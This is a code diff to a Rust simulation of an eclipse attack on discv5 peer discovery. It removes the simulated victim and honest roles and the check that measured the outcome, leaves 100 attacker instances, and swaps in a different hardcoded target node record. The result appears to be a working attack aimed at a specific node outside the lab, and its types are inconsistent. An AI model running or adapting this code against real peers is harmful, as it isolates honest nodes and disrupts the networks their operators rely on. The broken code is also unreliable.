@@ -21,16 +21,12 @@ const STATE_DONE: &str = "STATE_DONE";
 
 #[derive(Clone, Debug, Serialize, Deserialize)]
 enum Role {
-    Victim,
-    Honest,
     Attacker,
 }
 
 impl From<&str> for Role {
     fn from(test_group_id: &str) -> Self {
         match test_group_id {
-            "victim" => Role::Victim,
-            "honest" => Role::Honest,
             "attackers" => Role::Attacker,
             _ => unreachable!(),
         }
@@ -64,7 +60,7 @@ impl MonopolizingByIncomingNodes {
         // Construct a local Enr
         // ////////////////////////
         // let enr_key = Self::generate_deterministic_keypair(client.group_seq(), &role);
-        let tikuna_base64 = "enr:-MK4QOYC2mt03zuNm5-DPcq4FHEYr5P9QFHUTxon5qCMOieLMTIDFILFdl08uZ6LOpeam7vhsZGO8MtVoMQ8lWuQQUmGAYV0g1L_h2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhMASAAeJc2VjcDI1NmsxoQPeUNm9svUBEZ99-IsG56vVH_evtW3AYo6CIUwn7Sf1yohzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
+        let tikuna_base64 = "enr:-MK4QFWZDeC-o1qz-kHtukwtUu0Q3XWpesXokKpEHpJ7W72pZAaE38elejUmUa7jC6uDQynTxsS1H6-BB1WGy7NrREKGAYXR7LkOh2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhKfrAeaJc2VjcDI1NmsxoQOp3zt0zihNH7Jb8eaGkJkfFzHpcmNxdvQEyQ6BI--FcYhzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
         let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
         client.record_message("Generating keys!!");
         let mut eclipse_keypairs: Vec<CombinedKey> = Self::generate_single_key_fill_buckets(&tikuna_enr, client.group_seq()%5).await;
@@ -113,7 +109,7 @@ impl MonopolizingByIncomingNodes {
             role,
         };
 
-        let (victim, honest, attackers) =
+        let attackers =
             self.collect_instance_info(&client, &instance_info).await?;
 
         client
@@ -127,41 +123,10 @@ impl MonopolizingByIncomingNodes {
         // Play the role
         // //////////////////////////////////////////////////////////////
         match instance_info.role {
-            Role::Victim => {
-                self.play_victim(discv5, client, &honest, &attackers)
-                    .await?
-            }
-            Role::Honest => self.play_honest(client).await?,
-            Role::Attacker => self.play_attacker(discv5, client, &victim).await?,
+            Role::Attacker => self.play_attacker(discv5, client).await?,
         }
 
         Ok(())
-    }
-
-    fn generate_deterministic_keypair(group_seq: u64, role: &Role) -> CombinedKey {
-        // Generate 20 key pairs. Distances between the first key pair and all other ones are the
-        // same. So in the node with the first key pair, node ids given from the other ones will be
-        // inserted into the same bucket.
-        //
-        // The 20 key pairs generated are assigned to participants according to its role as follows:
-        // - 0: victim
-        // - 1: honest
-        // - 2: attacker
-        // - 3: attacker
-        // ...
-        // - 19: attacker
-        //
-        // The `122488` seed is a pre-computed one for this function. See `find_seed_same_bucket()`
-        // in https://github.com/sigp/discv5/blob/master/src/discv5/test.rs for more details of the
-        // pre-computing.
-        let mut keypairs = generate_deterministic_keypair(20, 122488);
-
-        let index = match role {
-            Role::Victim => group_seq,
-            Role::Honest => group_seq + 1, // Take the number of victim into account
-            Role::Attacker => group_seq + 2, // Take the number of victim + honest into account
-        } - 1; // The group_seq starts from 1, not from 0, so we should minus one here.
-        keypairs.remove(usize::try_from(index).expect("Valid as usize"))
     }
 
     async fn generate_keys_fill_buckets(enr_victim: &Enr, quantity_per_bucket: u64, number_buckets: u64) -> Vec<CombinedKey> {
@@ -206,88 +171,29 @@ impl MonopolizingByIncomingNodes {
         client: &Client,
         instance_info: &InstanceInfo,
     ) -> Result<(InstanceInfo, InstanceInfo, Vec<InstanceInfo>), Box<dyn std::error::Error>> {
-        let mut victim = vec![];
-        let mut honest = vec![];
         let mut attackers = vec![];
 
         for i in publish_and_collect(client, instance_info.clone()).await? {
             match i.role {
-                Role::Victim => victim.push(i),
-                Role::Honest => honest.push(i),
                 Role::Attacker => attackers.push(i),
             }
         }
 
-        assert!(victim.len() == 1 && honest.len() == 1 && attackers.len() == 98);
+        assert!(attackers.len() == 100);
 
-        Ok((victim.remove(0), honest.remove(0), attackers))
-    }
-
-    async fn play_victim(
-        &self,
-        discv5: Discv5,
-        client: Client,
-        honest: &InstanceInfo,
-        attackers: &Vec<InstanceInfo>,
-    ) -> Result<(), Box<dyn std::error::Error>> {
-        // Wait until the attacker has done its attack.
-        client
-            .barrier(
-                STATE_ATTACKERS_SENT_QUERY,
-                u64::try_from(attackers.len()).unwrap(),
-            )
-            .await?;
-
-        // For debugging, dump the routing table statistics.
-        for (i, bucket) in discv5.kbuckets().buckets_iter().enumerate() {
-            client.record_message(format!(
-                "[KBucket] index:{}, num_entries:{}, num_connected:{}, num_disconnected:{}",
-                i,
-                bucket.num_entries(),
-                bucket.num_connected(),
-                bucket.num_disconnected()
-            ));
-        }
-
-        // If the victim is vulnerable to the eclipse attack, this will result in `Table full`
-        // error because the bucket is full of the attacker's node id.
-        let result = discv5.add_enr(honest.enr.clone());
-
-        client
-            .signal_and_wait(STATE_DONE, client.run_parameters().test_instance_count)
-            .await?;
-
-        if let Err(msg) = result {
-            client
-                .record_failure(format!("Failed to add the honest node's ENR: {}", msg))
-                .await?;
-        } else {
-            client.record_success().await?;
-        }
-        Ok(())
-    }
-
-    async fn play_honest(&self, client: Client) -> Result<(), Box<dyn std::error::Error>> {
-        // Nothing to do, just wait until the simulation has been done.
-        client
-            .signal_and_wait(STATE_DONE, client.run_parameters().test_instance_count)
-            .await?;
-
-        client.record_success().await?;
-        Ok(())
+        Ok((attackers.remove(0), attackers.remove(0), attackers))
     }
 
     async fn play_attacker(
         &self,
         discv5: Discv5,
         client: Client,
-        _victim: &InstanceInfo,
     ) -> Result<(), Box<dyn std::error::Error>> {
         // The victim's ENR is added to the attacker's routing table prior to sending a query. So
         // the FINDNODE query will be sent to the victim, and then, if the victim is vulnerable
         // to the eclipse attack, the attacker's ENR will be added to the victim's routing table
         // because of the handshake.
-        let tikuna_base64 = "enr:-MK4QOYC2mt03zuNm5-DPcq4FHEYr5P9QFHUTxon5qCMOieLMTIDFILFdl08uZ6LOpeam7vhsZGO8MtVoMQ8lWuQQUmGAYV0g1L_h2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhMASAAeJc2VjcDI1NmsxoQPeUNm9svUBEZ99-IsG56vVH_evtW3AYo6CIUwn7Sf1yohzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
+        let tikuna_base64 = "enr:-MK4QFWZDeC-o1qz-kHtukwtUu0Q3XWpesXokKpEHpJ7W72pZAaE38elejUmUa7jC6uDQynTxsS1H6-BB1WGy7NrREKGAYXR7LkOh2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhKfrAeaJc2VjcDI1NmsxoQOp3zt0zihNH7Jb8eaGkJkfFzHpcmNxdvQEyQ6BI--FcYhzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
         let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
         let current_ip_address = client.run_parameters().data_network_ip()?.expect("IP address for the data network");
         client.record_message(format!("Current IP address: {:?}", current_ip_address));
@@ -299,14 +205,6 @@ impl MonopolizingByIncomingNodes {
         }
 
         sleep(Duration::from_millis(10000));
-        // Inform that sending query has been done.
-        client.signal(STATE_ATTACKERS_SENT_QUERY).await?;
-
-        // Wait until checking on the victim has been done.
-        client
-            .signal_and_wait(STATE_DONE, client.run_parameters().test_instance_count)
-            .await?;
-
         client.record_success().await?;
         Ok(())
     }
